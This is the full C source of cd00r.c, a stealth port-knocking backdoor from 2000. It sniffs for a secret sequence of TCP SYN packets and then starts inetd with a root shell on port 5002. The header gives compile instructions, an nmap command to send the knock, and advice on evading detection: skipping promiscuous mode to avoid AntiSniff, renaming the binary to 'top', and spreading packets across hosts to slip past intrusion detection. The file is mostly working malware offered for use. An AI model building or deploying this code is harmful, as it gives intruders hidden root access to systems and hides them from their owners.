/* cdoor.c 
 * packet coded backdoor
 * 
 * FX of Phenoelit <fx@phenoelit.de>
 * http://www.phenoelit.de/  
 * (c) 2k 
 *
 * $Id: cd00r.c,v 1.3 2000/06/13 17:32:24 fx Exp fx $
 *
 *
    'cd00r.c' is a proof of concept code to test the idea of a 
    completely invisible (read: not listening) backdoor server. 

    Standard backdoors and remote access services have one major problem: 
    The port's they are listening on are visible on the system console as 
    well as from outside (by port scanning).

    The approach of cd00r.c is to provide remote access to the system without 
    showing an open port all the time. This is done by using a sniffer on the 
    specified interface to capture all kinds of packets. The sniffer is not 
    running in promiscuous mode to prevent a kernel message in syslog and 
    detection by programs like AnitSniff. 
    To activate the real remote access service (the attached code starts an 
    inetd to listen on port 5002, which will provide a root shell), one has to 
    send several packets (TCP SYN) to ports on the target system. Which ports 
    in which order and how many of them can be defined in the source code.

    When port scanning the target, no open port will show up because there is 
    no service listening. After sending the right SYN packets to the system, 
    cd00r starts the listener and the port(s) is/are open. One nice side effect 
    is, that cd00r does not care whenever the port used as code is open or not. 
    Services running on ports used as code are still fully functional, but it's 
    not a very good idea to use these ports as explained later.

    The best way to send the required SYN packets to the system is 
    the use of nmap:
    ./nmap -sS -T Polite -p<port1>,<port2>,<port3>  <target>
    NOTE: the Polite timing ensures, that nmap sends the packets serial as
    defined.

    Details:
    Prevention of local detection is done by several things:
    First of all, the program gives no messages et all. It accepts only one 
    configurable command line option, which will show error messages for 
    the sniffer functions and other initialization stuff before 
    the first fork(). 
    All configuration is done in the first part of the source code as #defines. 
    This leaves the target system without configuration files and the process 
    does not show any command line options in the process table. When renaming 
    the binary file to something like 'top', it is nearly invisible.

    The sniffer part of the code uses the LBNL libpcap and it's good filter 
    functionality to prevent uninteresting traffic from entering the much 
    slower test functions. By selecting higher, usually not used, ports as 
    part of the code, the sniffer consumes nearly no processing time et all.

    Prevention of remote detection is primary the responsibility of the 
    'user'. By selecting more then 8 ports in changing order and in the 
    higher range (>20000), it is nearly impossible to brute force these 
    without rendering the system useless. 
    Several configurable options support the defense against remote attacks: 
    cd00r can look at the source address and (if defined) resets the code if 
    a packet from another location arrives. By not using this function, one 
    can activate the remote shell by sending the right packets from several 
    systems, hereby flying below the IDS radar. 
    Another feature is to reset or not reset the list of remaining ports 
    (code list), if a false packet arrives. On heavy loaded systems this 
    can happen often and would prevent the authorized sender to activate 
    the remote shell. Again, when flying below the IDS radar, such 
    functionality can be counterproductive because the usual way to 
    prevent detection by an IDS is to send packets with long delays. 

    What action cd00r actually takes is open to the user. The function 
    cdr_open_door() is called without any argument. It fork()s twice 
    to prevent zombies. Just add your code after the fork()s.

    The functionality outlined in these lines of terrific C source can 
    be used for booth sides of the security game. If you have a system 
    somewhere in the wild and you don't like to show open ports (except 
    the usual httpd ;-) to the world, you may consider some modifications, 
    so cd00r will provide you with a running ssh. 
    On the other hand, one may like to create a backchanel, therefor never
    providing any kind of listening port on the system.

    Even the use of TCP SYN packets is just an example. Using the sniffer,
    one can easily change the opening conditions to something like two SYN, one 
    ICMP echo request and five UDP packets. I personally like the TCP/SYN stuff
    because it has many possible permutations without changing the code.

 Compile it as:

 gcc -o <whatever> -I/where/ever/bpf -L/where/ever/bpf cd00r.c -lpcap

 of for some debug output:

 gcc -DDEBUG -o <whatever> -I/where/ever/bpf -L/where/ever/bpf cd00r.c -lpcap

 */


/* cd00r doesn't use command line arguments or a config file, because this 
 * would provide a pattern to look for on the target systems
 *
 * instead, we use #defines to specifiy variable parameters such as interface 
 * to listen on and perhaps the code ports
 */

/* the interface tp "listen" on */
#define CDR_INTERFACE		"eth0"
/* the address to listen on. Comment out if not desired 
 * NOTE: if you don't use CDR_ADDRESS, traffic FROM the target host, which 
 *       matches the port code also opens the door*/
/* #define CDR_ADDRESS		"192.168.1.1"  */

/* the code ports.
 * These are the 'code ports', which open (when called in the right order) the 
 * door (read: call the cdr_open_door() function).
 * Use the notation below (array) to specify code ports. Terminate the list
 * with 0 - otherwise, you really have problems.
 */
#define CDR_PORTS		{ 200,80,22,53,3,00 }

/* This defines that a SYN packet to our address and not to the right port 
 * causes the code to reset. On systems with permanent access to the internet
 * this would cause cd00r to never open, especially if they run some kind of 
 * server. Additional, if you would like to prevent an IDS from detecting your
 * 'unlock' packets as SYN-Scan, you have to delay them. 
 * On the other hand, not resetting the code means that
 * with a short/bad code the chances are good that cd00r unlocks for some 
 * random traffic or after heavy portscans. If you use CDR_SENDER_ADDR these
 * chances are less.
 * 
 * To use resets, define CDR_CODERESET 
 */
#define CDR_CODERESET

/* If you like to open the door from different addresses (e.g. to
 * confuse an IDS), don't define this.
 * If defined, all SYN packets have to come from the same address. Use
 * this when not defining CDR_CODERESET.
 */
#define CDR_SENDER_ADDR

/* this defines the one and only command line parameter. If given, cd00r
 * reports errors befor the first fork() to stderr.
 * Hint: don't use more then 3 characters to pervent strings(1) fishing
 */
#define CDR_NOISE_COMMAND	"noi"


/****************************************************************************
 * Nothing to change below this line (hopefully)
 ****************************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <netinet/in.h>                 /* for IPPROTO_bla consts */
#include <sys/socket.h>                 /* for inet_ntoa() */
#include <arpa/inet.h>                  /* for inet_ntoa() */
#include <netdb.h>			/* for gethostbyname() */
#include <sys/types.h>			/* for wait() */
#include <sys/wait.h>			/* for wait() */

#include <pcap.h>
#include <net/bpf.h>

#define ETHLENGTH 	14
#define IP_MIN_LENGTH 	20
#define CAPLENGTH	98



struct iphdr {
        u_char  ihl:4,        /* header length */
        version:4;              /* version */
        u_char  tos;          /* type of service */
        short   tot_len;      /* total length */
        u_short id;           /* identification */
        short   off;          /* fragment offset field */
        u_char  ttl;          /* time to live */
        u_char  protocol;     /* protocol */
        u_short check;        /* checksum */
        struct  in_addr saddr;
	struct  in_addr daddr;  /* source and dest address */
};

struct tcphdr {
        unsigned short int 	src_port;
	unsigned short int 	dest_port;
        unsigned long int 	seq_num;
        unsigned long int 	ack_num;
	unsigned short int	rawflags;
        unsigned short int 	window;
        long int 		crc_a_urgent;
        long int 		options_a_padding;
};

/* the ports which have to be called (by a TCP SYN packet), before
 * cd00r opens 
 */
unsigned int 	cports[] = CDR_PORTS;
int		cportcnt = 0;
/* which is the next required port ? */
int		actport = 0;

#ifdef CDR_SENDER_ADDR
/* some times, looking at sender's address is desired.
 * If so, sender's address is saved here */
struct in_addr	sender;
#endif CDR_SENDER_ADDR

/********
 * cdr_open_door() is called, when all port codes match
 * This function can be changed to whatever you like to do when the system
 * accepts the code 
 ********/
void cdr_open_door(void) {
    FILE	*f;

    char	*args[] = {"/usr/sbin/inetd","/tmp/.ind",NULL};

    switch (fork()) {
	case -1: 
#ifdef DEBUG
	    printf("fork() failed ! Fuck !\n");
#endif DEBUG
	    return;
	case 0: 
	    /* To prevent zombies (inetd-zombies look quite stupid) we do
	     * a second fork() */
	    switch (fork()) {
		case -1: _exit(0);
		case 0: /*that's fine */
			 break;
		default: _exit(0);
	    }
	     break;

	default: 
	     wait(NULL);
	     return;
    }

    if ((f=fopen("/tmp/.ind","a+t"))==NULL) return;
    fprintf(f,"5002  stream  tcp     nowait  root    /bin/sh  sh\n");
    fclose(f);

    execv("/usr/sbin/inetd",args);
#ifdef DEBUG
    printf("Strange return from execvp() !\n");
#endif DEBUG
    exit (0);

}


/* error function for pcap lib */
void capterror(pcap_t *caps, char *message) {
    pcap_perror(caps,message);
    exit (-1);
}

/* signal counter/handler */
void signal_handler(int sig) {
    /* the ugly way ... */
    _exit(0);
}

void *smalloc(size_t size) {
    void	*p;

    if ((p=malloc(size))==NULL) {
	exit(-1);
    }
    memset(p,0,size);
    return p;
}


/* general rules in main():
 * 	- errors force an exit without comment to keep the silence
 * 	- errors in the initialization phase can be displayed by a 
 * 	  command line option 
 */
int main (int argc, char **argv) {

    /* variables for the pcap functions */
#define	CDR_BPF_PORT 	"port "
#define CDR_BPF_ORCON	" or "
    char 		pcap_err[PCAP_ERRBUF_SIZE]; /* buffer for pcap errors */
    pcap_t 		*cap;                       /* capture handler */
    bpf_u_int32 	network,netmask;
    struct pcap_pkthdr 	*phead;
    struct bpf_program 	cfilter;	           /* the compiled filter */
    struct iphdr 	*ip;
    struct tcphdr 	*tcp;
    u_char		*pdata;
    /* for filter compilation */
    char		*filter;
    char		portnum[6];
    /* command line */
    int			cdr_noise = 0;
    /* the usual int i */
    int			i;
    /* for resolving the CDR_ADDRESS */
#ifdef CDR_ADDRESS
    struct hostent	*hent;
#endif CDR_ADDRESS



    /* check for the one and only command line argument */
    if (argc>1) {
	if (!strcmp(argv[1],CDR_NOISE_COMMAND)) 
	    cdr_noise++;
	else 
	    exit (0);
    } 

    /* resolve our address - if desired */
#ifdef CDR_ADDRESS
    if ((hent=gethostbyname(CDR_ADDRESS))==NULL) {
	if (cdr_noise) 
	    fprintf(stderr,"gethostbyname() failed\n");
	exit (0);
    }
#endif CDR_ADDRESS

    /* count the ports our user has #defined */
    while (cports[cportcnt++]);
    cportcnt--;
#ifdef DEBUG
    printf("%d ports used as code\n",cportcnt);
#endif DEBUG

    /* to speed up the capture, we create an filter string to compile. 
     * For this, we check if the first port is defined and create it's filter,
     * then we add the others */
    
    if (cports[0]) {
	memset(&portnum,0,6);
	sprintf(portnum,"%d",cports[0]);
	filter=(char *)smalloc(strlen(CDR_BPF_PORT)+strlen(portnum)+1);
	strcpy(filter,CDR_BPF_PORT);
	strcat(filter,portnum);
    } else {
	if (cdr_noise) 
	    fprintf(stderr,"NO port code\n");
	exit (0);
    } 

    /* here, all other ports will be added to the filter string which reads
     * like this:
     * port <1> or port <2> or port <3> ...
     * see tcpdump(1)
     */
    
    for (i=1;i<cportcnt;i++) {
	if (cports[i]) {
	    memset(&portnum,0,6);
	    sprintf(portnum,"%d",cports[i]);
	    if ((filter=(char *)realloc(filter,
			    strlen(filter)+
			    strlen(CDR_BPF_PORT)+
			    strlen(portnum)+
			    strlen(CDR_BPF_ORCON)+1))
		    ==NULL) {
		if (cdr_noise)
		    fprintf(stderr,"realloc() failed\n");
		exit (0);
	    }
	    strcat(filter,CDR_BPF_ORCON);
	    strcat(filter,CDR_BPF_PORT);
	    strcat(filter,portnum);
	}
    } 

#ifdef DEBUG
    printf("DEBUG: '%s'\n",filter);
#endif DEBUG

    /* initialize the pcap 'listener' */
    if (pcap_lookupnet(CDR_INTERFACE,&network,&netmask,pcap_err)!=0) {
	if (cdr_noise)
	    fprintf(stderr,"pcap_lookupnet: %s\n",pcap_err);
	exit (0);
    }

    /* open the 'listener' */
    if ((cap=pcap_open_live(CDR_INTERFACE,CAPLENGTH,
		    0,	/*not in promiscuous mode*/
		    0,  /*no timeout */
		    pcap_err))==NULL) {
	if (cdr_noise)
	    fprintf(stderr,"pcap_open_live: %s\n",pcap_err);
	exit (0);
    }

    /* now, compile the filter and assign it to our capture */
    if (pcap_compile(cap,&cfilter,filter,0,netmask)!=0) {
	if (cdr_noise) 
	    capterror(cap,"pcap_compile");
	exit (0);
    }
    if (pcap_setfilter(cap,&cfilter)!=0) {
	if (cdr_noise)
	    capterror(cap,"pcap_setfilter");
	exit (0);
    }

    /* the filter is set - let's free the base string*/
    free(filter);
    /* allocate a packet header structure */
    phead=(struct pcap_pkthdr *)smalloc(sizeof(struct pcap_pkthdr));

    /* register signal handler */
    signal(SIGABRT,&signal_handler);
    signal(SIGTERM,&signal_handler);
    signal(SIGINT,&signal_handler);

    /* if we don't use DEBUG, let's be nice and close the streams */
#ifndef DEBUG
    fclose(stdin);
    fclose(stdout);
    fclose(stderr);
#endif DEBUG

    /* go daemon */
    switch (i=fork()) {
	case -1:
	    if (cdr_noise)
		fprintf(stderr,"fork() failed\n");
	    exit (0);
	    break;	/* not reached */
	case 0:
	    /* I'm happy */
	    break;
	default:
	    exit (0);
    }

    /* main loop */
    for(;;) {
	/* if there is no 'next' packet in time, continue loop */
	if ((pdata=(u_char *)pcap_next(cap,phead))==NULL) continue;
	/* if the packet is to small, continue loop */
	if (phead->len<=(ETHLENGTH+IP_MIN_LENGTH)) continue; 
	
	/* make it an ip packet */
	ip=(struct iphdr *)(pdata+ETHLENGTH);
	/* if the packet is not IPv4, continue */
	if ((unsigned char)ip->version!=4) continue;
	/* make it TCP */
	tcp=(struct tcphdr *)(pdata+ETHLENGTH+((unsigned char)ip->ihl*4));

	/* FLAG check's - see rfc793 */
	/* if it isn't a SYN packet, continue */
	if (!(ntohs(tcp->rawflags)&0x02)) continue;
	/* if it is a SYN-ACK packet, continue */
	if (ntohs(tcp->rawflags)&0x10) continue;

#ifdef CDR_ADDRESS
	/* if the address is not the one defined above, let it be */
	if (hent) {
#ifdef DEBUG
	    if (memcmp(&ip->daddr,hent->h_addr_list[0],hent->h_length)) {
		printf("Destination address mismatch\n");
		continue;
	    }
#else 
	    if (memcmp(&ip->daddr,hent->h_addr_list[0],hent->h_length)) 
		continue;
#endif DEBUG
	}
#endif CDR_ADDRESS

	/* it is one of our ports, it is the correct destination 
	 * and it is a genuine SYN packet - let's see if it is the RIGHT
	 * port */
	if (ntohs(tcp->dest_port)==cports[actport]) {
#ifdef DEBUG
	    printf("Port %d is good as code part %d\n",ntohs(tcp->dest_port),
		    actport);
#endif DEBUG
#ifdef CDR_SENDER_ADDR
	    /* check if the sender is the same */
	    if (actport==0) {
		memcpy(&sender,&ip->saddr,4);
	    } else {
		if (memcmp(&ip->saddr,&sender,4)) { /* sender is different */
		    actport=0;
#ifdef DEBUG
		    printf("Sender mismatch\n");
#endif DEBUG
		    continue;
		}
	    }
#endif CDR_SENDER_ADDR
	    /* it is the rigth port ... take the next one
	     * or was it the last ??*/
	    if ((++actport)==cportcnt) {
		/* BINGO */
		cdr_open_door();
		actport=0;
	    } /* ups... some more to go */
	} else {
#ifdef CDR_CODERESET
	    actport=0;
#endif CDR_CODERESET
	    continue;
	}
    } /* end of main loop */

    /* this is actually never reached, because the signal_handler() does the 
     * exit.
     */
    return 0;
}
